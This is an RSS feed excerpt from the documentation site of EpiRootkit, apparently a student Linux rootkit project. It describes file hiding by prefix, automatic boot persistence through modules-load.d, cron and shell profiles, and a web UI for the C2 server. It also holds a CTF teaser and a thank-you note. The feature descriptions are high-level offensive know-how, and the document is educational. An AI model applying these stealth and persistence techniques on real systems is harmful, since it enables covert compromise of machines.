&lt;/ol>
&lt;h3 id="hidden-file-prefixes">Hidden File Prefixes &lt;a href="#hidden-file-prefixes" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Files starting with these prefixes are automatically hidden:&lt;/p></description></item><item><title>Persistence</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
&lt;h2 id="what-we-implemented">What We Implemented &lt;a href="#what-we-implemented" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="three-persistence-mechanisms">Three Persistence Mechanisms &lt;a href="#three-persistence-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>modules-load.d&lt;/strong>: Systemd automatic module loading&lt;/li>
&lt;li>&lt;strong>Cron Jobs&lt;/strong>: Scheduled module loading via cron&lt;/li>
&lt;li>&lt;strong>Shell Profiles&lt;/strong>: Load via user login scripts&lt;/li>
&lt;/ol>
&lt;h3 id="automatic-installation">Automatic Installation &lt;a href="#automatic-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>On module load&lt;/strong>: All persistence mechanisms installed automatically&lt;/li>
&lt;li>&lt;strong>Dynamic control&lt;/strong>: Install/remove via C2 commands&lt;/li>
&lt;li>&lt;strong>Individual control&lt;/strong>: Manage each mechanism separately&lt;/li>
&lt;/ul>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-installation-1">Automatic Installation &lt;a href="#automatic-installation-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically installs all persistence mechanisms:&lt;/p></description></item><item><title>README</title><link>/docs/06-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/06-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/main-dashboard.png"
 alt="Web UI">
&lt;/figure>

&lt;p>The Web UI is a modern frontend for the EpiRootkit Attacking Program (C2 Server). It provides a graphical, tiling window manager interface for managing clients, sending commands, and monitoring events.&lt;/p>
&lt;p>&lt;strong>Philosophy:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Usability and productivity for operators&lt;/li>
&lt;li>Real-time feedback and event visibility&lt;/li>
&lt;li>Extensible, modular panel system&lt;/li>
&lt;li>Keyboard-driven workflow (with mouse support)&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Main Features:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Tiling window manager UI for flexible panel arrangement&lt;/li>
&lt;li>Real-time event log panel&lt;/li>
&lt;li>Terminal, Overview, and Upload/Download panels&lt;/li>
&lt;li>Global keyboard shortcuts for all major actions&lt;/li>
&lt;li>Drag-and-drop panel reordering&lt;/li>
&lt;/ul>
&lt;p>This section covers the rationale, features, and usage of the Web UI. See the following pages for details on setup, features, and development notes.&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/06-web-ui/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/installation/</guid><description>&lt;h1 id="web-ui-installation--setup">Web UI Installation &amp;amp; Setup &lt;a href="#web-ui-installation--setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu system. Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Host Environment Setup&lt;/a> first.&lt;/p>
&lt;/blockquote>
&lt;h2 id="1-install-nodejs-npm-and-pnpm">1. Install Node.js, npm, and pnpm &lt;a href="#1-install-nodejs-npm-and-pnpm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If not already installed, run:&lt;/p>



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="3f389ed" class="language-bash ">
 &lt;code>sudo apt update
sudo apt install -y nodejs npm
sudo npm install -g pnpm&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;blockquote>

&lt;div class="alert alert-info d-flex" role="alert">
 &lt;div class="flex-shrink-1 alert-icon">
 
 &lt;span class="material-icons size-20 me-2">
 info
 &lt;/span>&lt;/div>
 
 &lt;div class="w-100">Check your versions: Node.js v18+ and pnpm v8+ are recommended. Use &lt;code>node -v&lt;/code> and &lt;code>pnpm -v&lt;/code> to verify.&lt;/div>
 &lt;/div>
&lt;/blockquote>
&lt;h2 id="2-navigate-to-the-web-ui-directory">2. Navigate to the Web UI Directory &lt;a href="#2-navigate-to-the-web-ui-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="db8fc69" class="language-bash ">
 &lt;code>cd webui&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="3-install-dependencies">3. Install Dependencies &lt;a href="#3-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b879665" class="language-bash ">
 &lt;code>pnpm install
# Or, if you prefer npm:
npm install&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="4-start-the-development-server">4. Start the Development Server &lt;a href="#4-start-the-development-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b881346" class="language-bash ">
 &lt;code>pnpm run dev
# Or
npm run dev&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>Open your browser and go to &lt;a href="http://localhost:5173" rel="external" target="_blank">http://localhost:5173&lt;svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">&lt;path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/>&lt;/svg>&lt;/a> (or the port shown in your terminal).&lt;/p></description></item><item><title>i3 like interface</title><link>/docs/06-web-ui/i3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/i3/</guid><description>&lt;h2 id="i3-like-interface">i3 like interface &lt;a href="#i3-like-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Yes, you read that right. I really tried to make this part of the Web UI feel like i3-wm.&lt;/p>
&lt;figure class="img-fluid">&lt;img src="/images/webui/i3.png"
 alt="i3 like interface">
&lt;/figure>

&lt;p>Basically it&amp;rsquo;s a tiling window manager that allows you to move panels around with the keyboard.&lt;/p>
&lt;h2 id="why-">Why ? &lt;a href="#why-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Because I bloody can, that&amp;rsquo;s why.&lt;/p>

&lt;div class="alert alert-info d-flex" role="alert">
 &lt;div class="flex-shrink-1 alert-icon">
 
 &lt;span class="material-icons size-20 me-2">
 info
 &lt;/span>&lt;/div>
 
 &lt;div class="w-100">I had to use &lt;code>Alt&lt;/code> as Modifier, I&amp;rsquo;m truly saddened by this but Ubuntu wouldn&amp;rsquo;t let me use the &lt;code>Windows&lt;/code> key in firefox&amp;hellip;&lt;/div>
 &lt;/div>
&lt;p>You can use this as like a dashboard widgets where you can move the panels around resize them etc to neatly manage your precious display real estate.&lt;/p></description></item><item><title>Tux Fan Club: Chasse au Trésor Pirate</title><link>/docs/07-bonuses/wlkom-ctf/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/07-bonuses/wlkom-ctf/</guid><description>&lt;h2 id="treasure-hunt-">Treasure Hunt 🪙 &lt;a href="#treasure-hunt-" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="découverte-dun-mystérieux-fichier">Découverte d&amp;rsquo;un mystérieux fichier&amp;hellip; &lt;a href="#d%c3%a9couverte-dun-myst%c3%a9rieux-fichier" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Nous avons décidé d&amp;rsquo;accepter une &lt;em>quête secondaire&lt;/em> durant le projet &lt;code>Rootkit&lt;/code>.&lt;/p>
&lt;p>En effet, comme tout bon pirate, nous avons téléchargé &lt;em>légalement&lt;/em> les fichiers fournis (&lt;code>given files&lt;/code>) et nous souhaitions les ignorer avec un fichier &lt;code>.gitignore&lt;/code>.&lt;/p>
&lt;p>Le &lt;code>.gitignore&lt;/code> ressemblait à :&lt;/p>



 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="00cf8f5" class="language-bash ">
 &lt;code>.gitignore
givenfiles/&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>Sauf que les fichiers n&amp;rsquo;étaient pas ignorés. C&amp;rsquo;est là que nous découvrons un mystérieux fichier &lt;code>.README&lt;/code> :&lt;/p>
&lt;p>&lt;figure>&lt;img src="/images/ctf/givenfilestree.png"
 alt="Arborescence révélant le fichier caché">
&lt;/figure>

&lt;em>Arborescence révélant le fichier caché&lt;/em>&lt;/p></description></item><item><title>Un dernier mot</title><link>/docs/08-remerciements/thankyou/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/08-remerciements/thankyou/</guid><description>&lt;h1 id="hugo">Hugo &lt;a href="#hugo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Bonjour,&lt;/p>
&lt;p>Merci beaucoup Jules pour ce projet!&lt;/p>
&lt;p>Il m&amp;rsquo;a permis d’expérimenter plein de sujets différents, j&amp;rsquo;ai profité de l&amp;rsquo;excuse de &amp;ldquo;c&amp;rsquo;est pour le travail d&amp;rsquo;EPITA&amp;rdquo; pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j&amp;rsquo;ai pu mettre en pratique directement ce que j&amp;rsquo;ai pu apprendre dans mon travail, notamment j&amp;rsquo;avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j&amp;rsquo;ai pu m&amp;rsquo;en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n&amp;rsquo;ont qu’à bien se tenir). J&amp;rsquo;ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d&amp;rsquo;alternance on fait un projet aussi cool alors qu&amp;rsquo;ils se tapent de l’Active Directory depuis 2 mois.&lt;/p></description></item></channel></rss>